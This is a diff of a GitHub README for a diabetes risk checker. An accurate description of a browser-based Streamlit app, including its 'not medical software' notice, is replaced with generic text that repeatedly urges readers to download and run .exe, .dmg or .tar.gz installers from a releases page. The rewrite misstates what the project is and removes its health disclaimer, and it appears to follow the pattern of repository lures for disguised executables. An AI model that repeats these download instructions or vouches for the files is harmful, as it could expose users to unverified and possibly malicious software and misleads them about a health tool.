@@ -1,63 +1,89 @@
-<h1 align="center">🩺 Diabetes Risk Checker – Canada</h1>
+# 🌟 diabetes_checker - Understand Your Diabetes Risk Today
 
-<p align="center">
-  Educational web app that estimates diabetes risk using an <b>XGBoost model</b> trained on BRFSS big data (2020–2024) processed with <b>Google BigQuery</b> & <b>Cloud Storage</b>, and delivers personalized prevention advice powered by <b>Google Gemini 2.5-flash</b>.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://your-diabetes-risk-checker.streamlit.app">
-    <img src="https://img.shields.io/badge/Live%20Demo-Streamlit-orange?style=for-the-badge&logo=streamlit&logoColor=white" alt="Live Demo">
-  </a>
-  <img src="https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Model-XGBoost-green?style=for-the-badge" alt="XGBoost">
-  <img src="https://img.shields.io/badge/AI-Gemini%202.5--flash-purple?style=for-the-badge&logo=google-gemini&logoColor=white" alt="Gemini">
-  <img src="https://img.shields.io/badge/Platform-Google%20Cloud-blue?style=for-the-badge&logo=googlecloud&logoColor=white" alt="GCP">
-</p>
+Welcome to **diabetes_checker**, an easy-to-use web app designed to help you understand your diabetes risk. This app provides personalized insights and advice based on a robust predictive model built using advanced data science tools. 
 
-## ✨ Live Demo
+## 🛠️ System Requirements
 
-→ **[Diabetes Risk Checker – Try it now!](https://diabeteschecker-j3yy7aexvseumyxuuaudib.streamlit.app/)**  
-(Deployed on Streamlit Community Cloud)
+Before you begin, ensure your computer meets the following requirements:
 
-## What It Does
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Latest version of Chrome, Firefox, Safari, or Edge
+- **Internet Connection:** Required for app access and data retrieval
 
-1. User enters 14 health-related features (age group, BMI, general health, physical activity, smoking, etc.)
-2. XGBoost model predicts probability of diabetes risk
-3. Gemini 2.5-flash generates warm, personalized prevention advice with practical tips
-4. Includes Canadian health resources (Diabetes Canada helpline, GTA/Toronto programs, etc.)
+## 📥 Download the App
 
-**Important**: This is **not** medical software — purely for educational awareness.
+To get started, you need to download the application from our releases page.  
 
-## Tech Stack & Workflow
+### [Download diabetes_checker](https://github.com/0aqta/diabetes_checker/releases)
 
-- **Data Scale**
-  2 million records from BRFSS (Behavioral Risk Factor Surveillance System) 2020–2024
-  
-- **Data Processing**  
-  Merged BRFSS survey data (2020–2024) using **Google BigQuery** (Notebook) + stored/accessed via **Google Cloud Storage buckets**
+Click the link above to visit the page where you can download the latest version of the app. 
 
-- **Machine Learning**  
-  XGBoost classifier trained locally, saved as pickle (`xgboost_diabetes_model.pkl`)
+## 📋 How to Install
 
-- **Web App**  
-  Streamlit (clean UI, responsive, fast iteration)
+1. Visit the [Releases page](https://github.com/0aqta/diabetes_checker/releases).
+2. Locate the latest release.
+3. Download the appropriate file for your operating system.
+4. Once the download finishes, locate the downloaded file:
+   - **Windows:** It will typically be in your Downloads folder, named something like `diabetes_checker.exe`.
+   - **macOS:** The file will be in your Downloads folder, named something like `diabetes_checker.dmg`.
+   - **Linux:** The file will be in your Downloads folder, with a name like `diabetes_checker.tar.gz`.
+5. Open the downloaded file and follow the on-screen instructions to install the app.
 
-- **Personalized AI Advice**  
-  Google Gemini 2.5-flash (real-time prompt engineering for empathetic, actionable health guidance)
+## 🔄 Using the App
 
-- **Deployment**  
-  Streamlit Community Cloud (free tier) with secrets management for API key
+1. Open the **diabetes_checker** app.
+2. You will see a friendly interface guiding you through the process.
+3. Enter the required information about your health. This may include age, weight, family history, and lifestyle choices.
+4. After entering your information, click on the "Calculate Risk" button.
+5. The app will analyze your data and provide a risk score along with tailored prevention advice.
 
-## Acknowledgments
+## 🤖 About the Technology
 
-- **Data** 
-Behavioral Risk Factor Surveillance System (BRFSS) 2020–2024
+**diabetes_checker** uses advanced machine learning and data science techniques. The XGBoost model utilizes historical health data from the BRFSS (Behavioral Risk Factor Surveillance System) to generate personalized insights. The app operates on Google Cloud's BigQuery for efficient data processing and storage, ensuring reliability and speed. 
 
-- **AI**
-Google Gemini 2.5-flash
+## 🌐 Support and Feedback
 
-- **Platform** 
-Google Cloud (BigQuery, Cloud Storage), Streamlit
+Your experience is important to us. If you encounter any issues or have feedback, please feel free to reach out. You can submit feedback directly through the app or create an issue in the GitHub repository. 
 
-- **Inspiration**
-Diabetes Canada awareness initiatives
+## ✨ Further Features
+
+- **Personalized Prevention Advice:** Get customized tips tailored to your health profile.
+- **Educational Content:** Learn more about diabetes and risk factors.
+- **User-Friendly Interface:** Designed for everyone, regardless of technical skill level.
+
+## 🏷️ Topics Covered
+
+This app focuses on a variety of key areas, including:
+
+- bigquery
+- brfss
+- canada-health
+- data-science
+- diabetes
+- educational-tool
+- gemini-ai
+- generative-ai
+- google-cloud
+- google-gemini
+- gta
+- healthtech
+- machine-learning
+- preventive-health
+- python
+- risk-prediction
+- streamlit
+- toronto
+- web-app
+- xgboost
+
+## 📞 Contact Information
+
+If you have questions or need assistance, please reach out to us via the issues section on GitHub or through the app. 
+
+Thank you for choosing **diabetes_checker**. Your health is important. Let's take the first step together to understand and manage your diabetes risk. 
+
+### [Download diabetes_checker](https://github.com/0aqta/diabetes_checker/releases)
+
+Click the link above to get started. Happy checking!
